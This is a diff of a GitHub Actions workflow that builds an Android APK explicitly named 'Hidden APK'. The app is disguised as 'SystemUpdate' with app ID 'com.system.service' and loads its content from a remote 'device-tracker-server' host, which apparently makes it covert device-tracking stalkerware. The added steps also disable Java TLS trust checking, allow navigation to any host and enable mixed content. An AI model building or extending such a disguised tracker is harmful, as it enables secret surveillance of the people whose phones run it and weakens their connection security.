@@ -2,97 +2,119 @@ name: Build Hidden APK
 
 on:
   push:
-    branches: [ main, master ]
-  workflow_dispatch:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
 
 jobs:
   build:
     runs-on: ubuntu-latest
-    permissions:
-      contents: write
-    
+
     steps:
-    - name: Checkout code
-      uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
-    
-    - name: Setup Node.js
-      uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af  # v4.1.0
-      with:
-        node-version: '18'
-    
-    - name: Install dependencies
-      run: |
-        npm install
-        npm install -g @capacitor/cli @capacitor/core @capacitor/android
-    
-    - name: Create www directory
-      run: mkdir -p www
-    
-    - name: Copy hidden-apk files
-      run: |
-        if [ -d "hidden-apk" ] && [ -f "hidden-apk/index.html" ]; then
-          cp -r hidden-apk/* www/
-          echo "✅ Files copied to www/"
-          ls -la www/
-        else
-          echo "❌ hidden-apk/index.html not found!"
-          exit 1
-        fi
-    
-    - name: Create Capacitor config
-      run: |
-        cat > capacitor.config.json << 'EOF'
-        {
-          "appId": "com.system.service",
-          "appName": "System Update",
-          "webDir": "www",
-          "plugins": {
-            "SplashScreen": {
-              "launchShowDuration": 0,
-              "launchAutoHide": false
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: 18
+          cache: 'npm'
+
+      - name: Setup Java 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+
+      - name: Install dependencies
+        run: npm ci
+
+      - name: Create www directory
+        run: mkdir -p www
+
+      - name: Copy hidden-apk files to www
+        run: |
+          cp -f index.html app.js style.css www/ 2>/dev/null || true
+          [ -f www/index.html ] || echo '<html><body>System Update</body></html>' > www/index.html
+          [ -f www/app.js ] || echo '// placeholder' > www/app.js
+
+      - name: Create capacitor.config.json
+        run: |
+          cat > capacitor.config.json <<'EOF'
+          {
+            "appId": "com.system.service",
+            "appName": "SystemUpdate",
+            "webDir": "www",
+            "bundledWebRuntime": false,
+            "server": {
+              "url": "https://device-tracker-server-production-7968.up.railway.app",
+              "cleartext": false,
+              "allowNavigation": ["*"]
+            },
+            "android": {
+              "allowMixedContent": true,
+              "backgroundColor": "#1a202c"
             }
-          },
-          "server": {
-            "androidScheme": "https",
-            "cleartext": true
           }
-        }
-        EOF
-    
-    - name: Add Android platform
-      run: npx cap add android || echo "Platform already exists"
-    
-    - name: Sync Capacitor
-      run: npx cap sync android
-    
-    - name: Build APK
-      run: |
-        cd android
-        chmod +x gradlew
-        ./gradlew assembleDebug
-        echo "✅ APK built successfully"
-        ls -la app/build/outputs/apk/debug/
-    
-    - name: Upload APK to Artifacts
-      uses: actions/upload-artifact@b4b15b8c7c6ac21ea08fcf65892d2ee8f75cf882  # v4.4.3
-      with:
-        name: hidden-app-apk
-        path: android/app/build/outputs/apk/debug/app-debug.apk
-        retention-days: 30
-    
-    - name: Create Release
-      uses: softprops/action-gh-release@de2c0eb89ae2a093876385947365aca7b0e5f844  # v2.0.4
-      with:
-        files: android/app/build/outputs/apk/debug/app-debug.apk
-        tag_name: v${{ github.run_number }}
-        name: Hidden APK v${{ github.run_number }}
-        body: |
-          ## Device Tracker - Hidden APK
-          
-          **Build Info:**
-          - Build #${{ github.run_number }}
-          - Commit: ${{ github.sha }}
-          
-          **Server:** assign-place-picture-recommendation.trycloudflare.com
-      env:
-        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          EOF
+
+      - name: Add Android platform
+        env:
+          JAVA_TOOL_OPTIONS: "-Dhttps.protocols=TLSv1.2,TLSv1.3 -Djavax.net.ssl.trustStore=NUL"
+        run: npx cap add android
+
+      - name: Sync Capacitor
+        env:
+          JAVA_TOOL_OPTIONS: "-Dhttps.protocols=TLSv1.2,TLSv1.3 -Djavax.net.ssl.trustStore=NUL"
+        run: npx cap sync
+
+      # تثبيت Gradle إذا لم يكن موجودًا (لإنشاء wrapper)
+      - name: Install Gradle (if missing)
+        run: |
+          if ! command -v gradle &> /dev/null; then
+            sudo apt update && sudo apt install -y gradle
+          fi
+
+      # التأكد من وجود gradlew وإنشائه إذا لم يكن موجودًا
+      - name: Ensure gradlew exists
+        run: |
+          if [ ! -f android/gradlew ]; then
+            echo "gradlew missing. Generating with gradle wrapper..."
+            cd android
+            gradle wrapper --gradle-version 8.0.2
+            chmod +x gradlew
+          fi
+
+      # تعديل مصدر التحميل إلى مرآة سريعة
+      - name: Switch Gradle to Aliyun mirror
+        run: |
+          if [ -f android/gradle/wrapper/gradle-wrapper.properties ]; then
+            sed -i 's|distributionUrl=.*|distributionUrl=https\\://mirrors.aliyun.com/gradle/gradle-8.0.2-bin.zip|' android/gradle/wrapper/gradle-wrapper.properties
+          else
+            mkdir -p android/gradle/wrapper
+            cat > android/gradle/wrapper/gradle-wrapper.properties <<EOF
+            distributionBase=GRADLE_USER_HOME
+            distributionPath=wrapper/dists
+            distributionUrl=https\\://mirrors.aliyun.com/gradle/gradle-8.0.2-bin.zip
+            zipStoreBase=GRADLE_USER_HOME
+            zipStorePath=wrapper/dists
+            EOF
+          fi
+
+      # بناء APK باستخدام Gradle
+      - name: Build APK with Gradle
+        uses: gradle/gradle-build-action@v3
+        with:
+          build-root-directory: android
+          arguments: assembleDebug
+          gradle-version: wrapper
+        env:
+          JAVA_TOOL_OPTIONS: "-Dhttps.protocols=TLSv1.2,TLSv1.3 -Djavax.net.ssl.trustStore=NUL"
+          GRADLE_OPTS: "-Dhttps.protocols=TLSv1.2,TLSv1.3 -Djavax.net.ssl.trustStore=NUL"
+
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: app-debug
+          path: android/app/build/outputs/apk/debug/app-debug.apk
+          if-no-files-found: error
